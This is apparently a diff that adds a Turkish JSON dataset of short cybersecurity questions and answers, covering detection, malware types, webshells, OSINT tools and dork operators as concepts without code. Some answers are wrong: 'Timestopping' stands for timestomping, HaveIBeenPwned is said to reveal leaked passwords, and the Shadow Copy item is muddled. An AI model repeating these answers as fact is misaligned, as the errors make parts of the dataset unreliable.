+    "soru": "Saldırı tespiti için kullanılan başlıca yöntemler nelerdir?",
+    "cevap": "Saldırı tespiti, Anomali Tespiti ve İmza Tespiti olmak üzere iki ana yöntemle yapılır. Anomali tespiti normal dışı davranışları belirlerken, imza tespiti bilinen saldırı kalıplarını tanır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Protection",
+    "konu": "Bilgi Güvenliği Koruma Yöntemleri",
+    "soru": "Bilgi güvenliği kapsamında koruma nasıl sağlanır?",
+    "cevap": "Koruma; önleyici, tespit edici ve düzeltici kontrollerle sağlanır. Güçlü şifreleme, erişim kontrolü, güvenlik duvarları ve düzenli güncellemeler kritik yöntemlerdir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Diamond Model",
+    "konu": "Diamond Model of Intrusion Analysis",
+    "soru": "Diamond Model nedir ve saldırı analizinde nasıl kullanılır?",
+    "cevap": "Diamond Model, siber saldırıların dört temel unsurunu (Adversary, Capability, Infrastructure, Victim) ilişkilendirerek saldırı sürecini anlamaya yarar. Bu model analistlere olayların bağlantısını ve saldırı zincirini görme imkanı sağlar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "WAF",
+    "konu": "Web Application Firewall (WAF) Nedir?",
+    "soru": "WAF ne işe yarar ve web uygulamalarını nasıl korur?",
+    "cevap": "WAF, web uygulamalarına gelen trafiği filtreleyip kötü amaçlı istekleri engelleyen güvenlik duvarıdır. SQL injection, XSS gibi saldırılara karşı koruma sağlar.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "IDS",
+    "konu": "Intrusion Detection System (IDS) Temelleri",
+    "soru": "IDS nasıl çalışır ve ne amaçla kullanılır?",
+    "cevap": "IDS, ağ veya sistem üzerindeki anormal veya şüpheli aktiviteleri tespit eden sistemdir. Saldırıları önleyemez ama uyarı verir, böylece müdahale mümkün olur.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Waterhole Attack",
+    "konu": "Waterhole Attack Nedir?",
+    "soru": "Waterhole saldırısı nasıl yapılır ve hedefi nedir?",
+    "cevap": "Waterhole saldırısı, hedefin sık kullandığı güvenilir bir web sitesine zararlı kod yerleştirerek hedefin o siteye eriştiğinde enfekte olmasını sağlamaktır. Genellikle belirli bir organizasyon veya sektör hedef alınır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Backdoor",
+    "konu": "Backdoor Kavramı",
+    "soru": "Backdoor nedir ve saldırganlar nasıl kullanır?",
+    "cevap": "Backdoor, yetkisiz erişim sağlamak için sistemde gizlice açılan arka kapıdır. Saldırganlar sistem kontrolü ele geçirmek için backdoor kullanır, böylece normal erişim yollarını atlar.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Exploit",
+    "konu": "Exploit Nedir?",
+    "soru": "Exploit ne anlama gelir ve nasıl çalışır?",
+    "cevap": "Exploit, yazılımda veya sistemdeki güvenlik açıklarını kullanarak zararlı kod çalıştıran veya sisteme zarar veren araç veya kod parçasıdır. Güvenlik açıkları kapatılmazsa exploitler büyük tehdit oluşturur.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Payload",
+    "konu": "Payload Kavramı",
+    "soru": "Payload nedir ve saldırı senaryolarında nasıl kullanılır?",
+    "cevap": "Payload, exploit aracılığıyla hedef sisteme iletilen ve istenilen zararlı işlevi gerçekleştiren kod parçasıdır. Örneğin, ters bağlantı (reverse shell) açmak payload örneğidir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Macro",
+    "konu": "Makro Virüsleri ve Tehditleri",
+    "soru": "Makro virüsü nedir ve nasıl bulaşır?",
+    "cevap": "Makro virüsleri, Office dosyalarındaki makrolar aracılığıyla bulaşan zararlı yazılımlardır. Genellikle e-posta eki veya indirilen dosyalarla yayılır ve otomatik olarak kötü amaçlı komutlar çalıştırır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Malware",
+    "konu": "Malware Türleri ve Korunma",
+    "soru": "Malware nedir ve başlıca türleri nelerdir?",
+    "cevap": "Malware (zararlı yazılım), sistemlere zarar veren veya kontrolü ele geçiren yazılımlardır. Virüs, trojan, worm, ransomware, spyware gibi türleri vardır. Güncel antivirüs ve dikkatli kullanıcı davranışı korunmada etkilidir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Active Directory",
+    "konu": "Group Policy Nedir?",
+    "soru": "Active Directory'de Group Policy ne işe yarar?",
+    "cevap": "Group Policy, kullanıcı ve bilgisayar ayarlarını merkezi olarak yönetmek için kullanılır. Güvenlik ayarları, yazılım dağıtımı ve oturum açma scriptleri gibi yapılandırmalar uygulanabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Proxy",
+    "konu": "Reverse Proxy Nedir?",
+    "soru": "Reverse proxy ile forward proxy arasındaki fark nedir?",
+    "cevap": "Forward proxy, istemciler adına istekte bulunur ve genellikle istemcinin kimliğini gizler. Reverse proxy ise sunucular adına istekleri karşılar, yük dengeleme ve güvenlik sağlar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Detection",
+    "konu": "False Positive ve False Negative Nedir?",
+    "soru": "Saldırı tespit sistemlerinde False Positive ve False Negative ne anlama gelir?",
+    "cevap": "False Positive, zararsız bir olayın saldırı olarak algılanmasıdır. False Negative ise gerçek saldırının tespit edilememesidir. Her ikisi de güvenlik sistemlerinin etkinliğini etkiler.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Protection",
+    "konu": "DDoS Koruma Yöntemleri",
+    "soru": "DDoS saldırılarına karşı hangi koruma yöntemleri uygulanabilir?",
+    "cevap": "Trafik filtreleme, hız sınırlaması, CDN kullanımı ve özel anti-DDoS çözümleri saldırıları hafifletmek için kullanılır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Diamond Model",
+    "konu": "Diamond Model Uygulamaları",
+    "soru": "Diamond Model saldırı analizinde nasıl pratikte kullanılır?",
+    "cevap": "Analistler saldırgan davranışlarını, altyapıyı ve hedefi ilişkilendirerek saldırının genel yapısını çıkarır ve sonraki saldırılar için erken uyarı sistemleri oluşturur.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "WAF",
+    "konu": "WAF Kurulum ve Konfigürasyonu",
+    "soru": "Bir WAF nasıl kurulur ve konfigüre edilir?",
+    "cevap": "WAF, uygulamanın önüne konumlandırılır. Kuralları ve politikaları web uygulamasına uygun olarak ayarlanır, düzenli olarak güncellenir ve loglar izlenir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "IDS",
+    "konu": "NIDS ve HIDS Farkları",
+    "soru": "Network IDS (NIDS) ile Host IDS (HIDS) arasındaki fark nedir?",
+    "cevap": "NIDS, ağ trafiğini izler ve anormallikleri tespit eder. HIDS ise belirli bir cihazın sistem dosyalarını ve olaylarını denetler.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Waterhole Attack",
+    "konu": "Waterhole Saldırılarının Önlenmesi",
+    "soru": "Waterhole saldırılarına karşı alınabilecek önlemler nelerdir?",
+    "cevap": "Güncel antivirüs, güvenlik duvarları, kullanıcı eğitimi, sıkı erişim kontrolleri ve şüpheli site takibi önlemler arasında yer alır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Backdoor",
+    "konu": "Backdoor Tespiti",
+    "soru": "Sistemlerde backdoor varlığı nasıl tespit edilir?",
+    "cevap": "Anormal ağ trafiği, bilinmeyen süreçler, sistem dosyalarının değişimi ve IDS uyarıları backdoor tespitinde yardımcı olur.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Exploit",
+    "konu": "Zero-Day Exploit Nedir?",
+    "soru": "Zero-day exploit ne anlama gelir?",
+    "cevap": "Zero-day exploit, güvenlik açığı daha keşfedilmeden veya yama yapılmadan önce kullanılan exploit türüdür ve çok tehlikelidir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Payload",
+    "konu": "Payload Çeşitleri",
+    "soru": "Farklı payload türleri nelerdir?",
+    "cevap": "Reverse shell, bind shell, dosya indirme ve zararlı yazılım yükleme payload türlerine örnektir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Macro",
+    "konu": "Makroların Güvenlik Riskleri",
+    "soru": "Makrolar neden güvenlik riski oluşturur?",
+    "cevap": "Makrolar, otomatik komut dizileri olduğundan kötü amaçlı kod içerebilir ve kullanıcı fark etmeden sisteme zarar verebilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Malware",
+    "konu": "Ransomware Özellikleri",
+    "soru": "Ransomware nasıl çalışır ve kullanıcıya ne zarar verir?",
+    "cevap": "Ransomware, dosyaları şifreleyerek erişimi engeller ve şifre çözümü için fidye talep eder.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Shadow Copy",
+    "konu": "Shadow Copy Nedir?",
+    "soru": "Shadow Copy özelliği ne işe yarar?",
+    "cevap": "Windows'ta Shadow Copy, dosya ve klasörlerin önceki sürümlerini yedekleyip geri getirmeye yarayan bir sistem özelliğidir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Shadow Copy",
+    "konu": "Shadow Copy Güvenlik Riski",
+    "soru": "Siber saldırganlar Shadow Copy özelliğini nasıl kötüye kullanabilir?",
+    "cevap": "Saldırganlar Shadow Copy'yi şifreli dosyaların yedeğini alarak fidye yazılımı sonrası kurtarma seçeneklerini engellemek için silebilir veya değiştirebilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Timestopping",
+    "konu": "Timestopping Nedir?",
+    "soru": "Timestopping saldırı tekniği neyi hedefler?",
+    "cevap": "Timestopping, sistemdeki dosya ve logların zaman damgalarını değiştirerek izlerin silinmesini veya değiştirilmesini sağlar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Timestopping",
+    "konu": "Timestopping Önlemleri",
+    "soru": "Timestopping saldırılarını önlemek için ne yapılabilir?",
+    "cevap": "Dosya bütünlüğü izleme ve merkezi log yönetimi ile zaman damgalarının değiştirilmesi tespit edilerek saldırı engellenebilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Webshell",
+    "konu": "Webshell Nedir?",
+    "soru": "Webshell nasıl çalışır ve ne amaçla kullanılır?",
+    "cevap": "Webshell, web sunucusuna yüklenen kötü amaçlı komut dosyasıdır ve saldırganlara sunucu üzerinde komut çalıştırma imkanı verir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Webshell",
+    "konu": "Webshell Tespiti",
+    "soru": "Webshell varlığı nasıl tespit edilir?",
+    "cevap": "Şüpheli dosya isimleri, olağandışı trafik, dosya değişiklikleri ve IDS/IPS logları analiz edilerek tespit yapılabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Wayback Machine",
+    "konu": "Wayback Machine Kullanımı",
+    "soru": "Wayback Machine nedir ve nasıl kullanılır?",
+    "cevap": "Wayback Machine, internet sitelerinin geçmişe dönük arşivlerini saklayan bir hizmettir. Eski sayfalara ve içeriklere erişmek için kullanılır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Wayback Machine",
+    "konu": "Siber Güvenlikte Wayback Machine",
+    "soru": "Wayback Machine siber güvenlik analizlerinde nasıl fayda sağlar?",
+    "cevap": "Geçmiş site içerikleri incelenerek eski açıklardan veya gizlenmiş bilgiden faydalanılıp güvenlik açıkları araştırılabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "The Harvester",
+    "konu": "The Harvester Nedir?",
+    "soru": "The Harvester aracı ne işe yarar?",
+    "cevap": "The Harvester, e-posta adresleri, domain adları ve IP adresleri gibi açık kaynaklardan bilgi toplayan bir istihbarat toplama aracıdır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "The Harvester",
+    "konu": "The Harvester Kullanımı",
+    "soru": "The Harvester ile hangi kaynaklardan veri toplanabilir?",
+    "cevap": "Google, Bing, LinkedIn, Shodan gibi birçok arama motoru ve servis üzerinden veri toplayabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Shodan",
+    "konu": "Shodan Nedir?",
+    "soru": "Shodan aracı ne amaçla kullanılır?",
+    "cevap": "Shodan, internete açık cihazları, servisleri ve bunların güvenlik açıklarını keşfetmek için kullanılan bir arama motorudur.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Shodan",
+    "konu": "Shodan Güvenlik Riskleri",
+    "soru": "Shodan kullanımı nasıl risk oluşturabilir?",
+    "cevap": "Saldırganlar Shodan ile zayıf yapılandırılmış cihazları kolayca bulabilir ve hedefleyebilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Metasploit",
+    "konu": "Metasploit Nedir?",
+    "soru": "Metasploit Framework ne işe yarar?",
+    "cevap": "Metasploit, güvenlik açıklarını test etmek ve exploit geliştirmek için kullanılan popüler bir penetrasyon testi aracıdır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Metasploit",
+    "konu": "Metasploit Modülleri",
+    "soru": "Metasploit'te hangi modül türleri bulunur?",
+    "cevap": "Exploit, payload, auxiliary ve post modülleri gibi farklı türlerde modüller vardır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Awesome OSINT",
+    "konu": "Awesome OSINT Nedir?",
+    "soru": "Awesome OSINT kaynağı ne amaçla kullanılır?",
+    "cevap": "Awesome OSINT, açık kaynak istihbaratı için araçlar ve kaynakların derlendiği kapsamlı bir listedir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Awesome OSINT",
+    "konu": "Awesome OSINT Kullanımı",
+    "soru": "Awesome OSINT içeriği nasıl güncellenir ve yönetilir?",
+    "cevap": "GitHub üzerinden topluluk katkılarıyla sürekli güncellenir ve çeşitli kategorilerde organize edilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Maltego",
+    "konu": "Maltego Nedir?",
+    "soru": "Maltego aracı ne işe yarar?",
+    "cevap": "Maltego, ilişki haritalama ve veri görselleştirme için kullanılan güçlü bir OSINT aracıdır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Maltego",
+    "konu": "Maltego Transformları",
+    "soru": "Maltego'da transformlar ne amaçla kullanılır?",
+    "cevap": "Transformlar, veri kaynaklarından otomatik bilgi toplayıp ilişkileri keşfetmek için kullanılır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Nslookup",
+    "konu": "Nslookup Komutu",
+    "soru": "Nslookup ne işe yarar?",
+    "cevap": "Nslookup, DNS sorguları yapmak için kullanılan bir komut satırı aracıdır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Nslookup",
+    "konu": "Nslookup Kullanımı",
+    "soru": "Nslookup ile hangi tür DNS kayıtları sorgulanabilir?",
+    "cevap": "A, MX, NS, TXT, PTR gibi DNS kayıt türleri sorgulanabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "HaveIBeenPwned",
+    "konu": "HaveIBeenPwned Nedir?",
+    "soru": "HaveIBeenPwned servisi ne amaçla kullanılır?",
+    "cevap": "E-posta adreslerinin veri sızıntılarına dahil olup olmadığını kontrol etmek için kullanılır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "HaveIBeenPwned",
+    "konu": "HaveIBeenPwned Güvenlik",
+    "soru": "HaveIBeenPwned ile kullanıcılar hangi bilgileri öğrenebilir?",
+    "cevap": "Sızıntıya uğrayan hesap detayları, şifreler ve hangi sızıntılarda yer aldıkları görülebilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "SpiderFoot",
+    "konu": "SpiderFoot Nedir?",
+    "soru": "SpiderFoot aracı ne işe yarar?",
+    "cevap": "SpiderFoot, otomatik OSINT toplama ve analiz yapmak için kullanılan kapsamlı bir araçtır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "SpiderFoot",
+    "konu": "SpiderFoot Modülleri",
+    "soru": "SpiderFoot'ta hangi modüller bulunur?",
+    "cevap": "DNS, IP, domain, sızdırılmış veri ve sosyal medya gibi birçok modül desteklenir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Dig",
+    "konu": "Dig Komutu",
+    "soru": "Dig ne için kullanılır?",
+    "cevap": "Dig, DNS sorguları yapmak ve detaylı DNS bilgisi almak için kullanılan bir komut satırı aracıdır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Dig",
+    "konu": "Dig Sorgu Türleri",
+    "soru": "Dig ile hangi DNS kayıt türleri sorgulanabilir?",
+    "cevap": "A, AAAA, MX, NS, SOA, TXT gibi birçok DNS kayıt türü sorgulanabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Synapsint",
+    "konu": "Synapsint Nedir?",
+    "soru": "Synapsint aracı ne amaçla kullanılır?",
+    "cevap": "Synapsint, OSINT ve tehdit istihbaratı için veri toplama ve analiz yapan bir platformdur.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Synapsint",
+    "konu": "Synapsint Özellikleri",
+    "soru": "Synapsint hangi tür analizler yapabilir?",
+    "cevap": "Sosyal medya, dark web, IP, domain ve tehdit aktörleri hakkında detaylı bilgi sağlar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Tinfoleak",
+    "konu": "Tinfoleak Nedir?",
+    "soru": "Tinfoleak aracı ne amaçla kullanılır?",
+    "cevap": "Twitter hesaplarından detaylı OSINT verisi toplamak için kullanılan bir araçtır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Tinfoleak",
+    "konu": "Tinfoleak Kullanımı",
+    "soru": "Tinfoleak ile hangi tür veriler toplanabilir?",
+    "cevap": "Tweetler, etkileşimler, hashtagler, kullanıcı bilgileri ve bağlantılar toplanabilir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Google Dorking",
+    "konu": "Google Dorking Nedir?",
+    "soru": "Google Dorking ne işe yarar?",
+    "cevap": "Google Dorking, Google arama motorunu gelişmiş sorgularla kullanarak hassas ve gizli bilgilere ulaşma tekniğidir.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Google Dorking",
+    "konu": "Google Dorking Kullanımı",
+    "soru": "Google Dorking'de hangi operatörler sık kullanılır?",
+    "cevap": "site:, filetype:, intitle:, inurl:, intext: gibi operatörler yaygın kullanılır.",
+    "seviye": "Orta"
+  },{
+    "etiket": "Dark Web",
+    "konu": "Dark Web Nedir?",
+    "soru": "Dark Web ne amaçla kullanılır?",
+    "cevap": "Anonimlik sağlayarak yasadışı ve gizli iletişim, bilgi alışverişi için kullanılır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Dark Web",
+    "konu": "Dark Web'e Erişim",
+    "soru": "Dark Web'e nasıl erişilir?",
+    "cevap": "Özel tarayıcılar (Tor gibi) ve VPN kullanılarak erişim sağlanır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Side Channel Attack",
+    "konu": "Side Channel Attack Nedir?",
+    "soru": "Side Channel Attack nasıl çalışır?",
+    "cevap": "Kriptografik sistemlerde doğrudan algoritmaya saldırmak yerine, güç tüketimi, elektromanyetik sızıntı veya zamanlama gibi fiziksel yan kanallardan bilgi toplayarak yapılan saldırıdır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Air Gap",
+    "konu": "Air Gap Nedir?",
+    "soru": "Air Gap nasıl çalışır ve neden önemlidir?",
+    "cevap": "Bir bilgisayar sisteminin internete veya diğer ağlara fiziksel olarak bağlanmaması durumudur. Kritik altyapılarda güvenlik için kullanılır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Homomorphic Encryption",
+    "konu": "Homomorphic Encryption Nedir?",
+    "soru": "Homomorphic Encryption hangi sorunu çözer?",
+    "cevap": "Şifrelenmiş veriler üzerinde doğrudan işlem yapmaya izin verir, böylece veriler açılmadan güvenli hesaplamalar yapılabilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Honeytoken",
+    "konu": "Honeytoken Nedir?",
+    "soru": "Honeytoken ne işe yarar?",
+    "cevap": "Sisteme yerleştirilen sahte veri veya kaynaklardır; saldırgan tarafından erişildiğinde tespit amacıyla kullanılır.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "DNS Tunneling",
+    "konu": "DNS Tunneling Nedir?",
+    "soru": "DNS Tunneling saldırısı nasıl çalışır?",
+    "cevap": "DNS sorguları üzerinden gizli veri aktarımı yaparak ağ güvenliğini aşmaya yarayan bir tekniktir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Rowhammer Attack",
+    "konu": "Rowhammer Attack Nedir?",
+    "soru": "Rowhammer saldırısı nasıl gerçekleştirilir?",
+    "cevap": "RAM üzerindeki fiziksel bitlerin komşu hücrelerde değişikliğe yol açacak şekilde yoğun erişilmesiyle bilgi manipülasyonu sağlar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Deepfake",
+    "konu": "Deepfake Teknolojisi Nedir?",
+    "soru": "Deepfake siber saldırılarda nasıl kullanılır?",
+    "cevap": "Yapay zeka ile gerçek kişilerin görüntü veya seslerini taklit ederek kimlik avı veya dezenformasyon saldırılarında kullanılır.",
+    "seviye": "Orta"
+  },
+ {
+    "etiket": "AI-Powered Attacks",
+    "konu": "Yapay Zeka Destekli Siber Saldırılar",
+    "soru": "Yapay zeka nasıl siber saldırılarda kullanılıyor?",
+    "cevap": "Saldırganlar yapay zekayı otomatik sosyal mühendislik, phishing kampanyaları ve zafiyet taraması için kullanıyor. AI, saldırıları daha hedefli ve hızlı hale getiriyor.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Supply Chain Attacks",
+    "konu": "Tedarik Zinciri Saldırıları",
+    "soru": "Tedarik zinciri saldırıları neden bu kadar tehlikelidir?",
+    "cevap": "Güvenilen bir üçüncü taraf aracılığıyla sisteme sızılır ve böylece geniş çaplı zararlara yol açar. SolarWinds saldırısı buna örnektir.",
+    "seviye": "Orta"
+  },{
+    "etiket": "Extended Detection and Response (XDR)",
+    "konu": "Genişletilmiş Tespit ve Müdahale",
+    "soru": "XDR nedir ve hangi avantajları sağlar?",
+    "cevap": "Farklı güvenlik araçlarından gelen verileri birleştirip merkezi analiz ve müdahale imkanı sunar, böylece saldırılar daha hızlı tespit edilir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Ransomware-as-a-Service",
+    "konu": "Hizmet Olarak Fidye Yazılımı",
+    "soru": "RaaS modeli nedir?",
+    "cevap": "Saldırganlar fidye yazılımını kiralayarak teknik bilgi gerektirmeden saldırı düzenleyebilirler, bu da saldırı sayısını artırıyor.",
+    "seviye": "Orta"
+  },
+  {
+    "etiket": "Deepfake Phishing",
+    "konu": "Deepfake Destekli Kimlik Avı",
+    "soru": "Deepfake phishing nasıl çalışır?",
+    "cevap": "Ses veya video taklidiyle hedef kişinin güvenini kazanıp bilgi veya erişim elde etmeye çalışılır, daha inandırıcı saldırılar sağlar.",
+    "seviye": "İleri"
+  },
+ {
+    "etiket": "IoT Botnets",
+    "konu": "Nesnelerin İnterneti Botnetleri",
+    "soru": "IoT cihazları nasıl botnet saldırılarında kullanılır?",
+    "cevap": "Zayıf güvenlikli IoT cihazlar ele geçirilerek DDoS saldırılarında geniş çapta kullanılır, Mirai botnet buna örnektir.",
+    "seviye": "Orta"
+  }, {
+    "etiket": "Fog Computing Security",
+    "konu": "Bulutun Ucunda Güvenlik",
+    "soru": "Fog computing güvenlik riskleri nelerdir ve nasıl yönetilir?",
+    "cevap": "Fog computing, veriyi uç cihazlara yakın işleyerek gecikmeyi azaltır fakat dağıtık yapısı nedeniyle saldırıya açık birçok uç noktaya sahiptir. Güvenlik, uç cihazlarda güçlü kimlik doğrulama, veri şifreleme ve segmentasyon ile sağlanır.",
+    "seviye": "İleri"
+  },{
+    "etiket": "DEW (Directed Energy Weapons)",
+    "konu": "Yönlendirilmiş Enerji Silahları",
+    "soru": "Siber güvenlik bağlamında DEW teknolojileri ne anlam ifade eder?",
+    "cevap": "Yüksek yoğunluklu elektromanyetik dalgalarla donanım sabotajı veya kritik altyapıların kesintiye uğratılması için kullanılan silahlar. Bu alan, siber fiziksel saldırılarla birleşmektedir.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Fog of War",
+    "konu": "Siber Savunma Stratejisi",
+    "soru": "Fog of war stratejisi siber güvenlikte neyi ifade eder?",
+    "cevap": "Saldırganın hareketlerinin belirsizliği ve savunmacının karşı tedbirlerinin gizlenmesi ile karşılıklı karmaşık durum yaratma yaklaşımıdır. Hedef, saldırganı yanıltmak ve bilgi kirliliği yaratmaktır.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Cyber Deception",
+    "konu": "Siber Aldatma Teknikleri",
+    "soru": "Cyber deception yöntemleri nelerdir ve nasıl kullanılır?",
+    "cevap": "Sahte sistemler (honeypot), yanıltıcı bilgiler ve tuzaklar kullanarak saldırganların gerçek sistemlere erişmesini zorlaştırmak veya geciktirmek için yapılan stratejilerdir.",
+    "seviye": "Orta"
+  },{
+    "etiket": "Microsegmentation",
+    "konu": "Ağ güvenliği",
+    "soru": "Microsegmentation nedir ve siber güvenlikte nasıl kullanılır?",
+    "cevap": "Microsegmentation, veri merkezindeki veya bulut ortamındaki ağları küçük segmentlere bölerek, lateral hareketi engelleyen bir güvenlik yöntemidir. Saldırganların bir sistemden diğerine kolayca geçişini zorlaştırır.",
+    "seviye": "İleri"
+  },  {
+    "etiket": "Certificate Transparency",
+    "konu": "SSL sertifika güvenliği",
+    "soru": "Certificate Transparency (CT) ne işe yarar?",
+    "cevap": "Certificate Transparency, SSL/TLS sertifikalarının şeffaf bir şekilde loglanmasını sağlayan bir mekanizmadır. Sahte veya izinsiz sertifika kullanımını tespit etmeye yarar.",
+    "seviye": "İleri"
+  },
+  {
+    "etiket": "Memory Forensics",
+    "konu": "Adli bilişim",
+    "soru": "Memory forensics neden önemlidir?",
+    "cevap": "Memory forensics, sistem belleğinin analiz edilerek zararlı yazılımlar, gizli süreçler ve saldırı izlerinin tespit edilmesini sağlar. Disk tabanlı analizlerden farklı olarak, geçici veriler üzerinde çalışır.",
+    "seviye": "İleri"
+  },
+ {
+    "etiket": "Firmware Security",
+    "konu": "Donanım yazılımı güvenliği",
+    "soru": "Firmware saldırılarına karşı nasıl korunulur?",
+    "cevap": "Firmware saldırılarına karşı korunmak için donanım güvenlik modülleri (TPM), imzalı firmware güncellemeleri ve güvenli boot mekanizmaları kullanılır. Ayrıca düzenli firmware güncellemeleri de önemlidir.",
+    "seviye": "İleri"
+  },
+
+
 ]
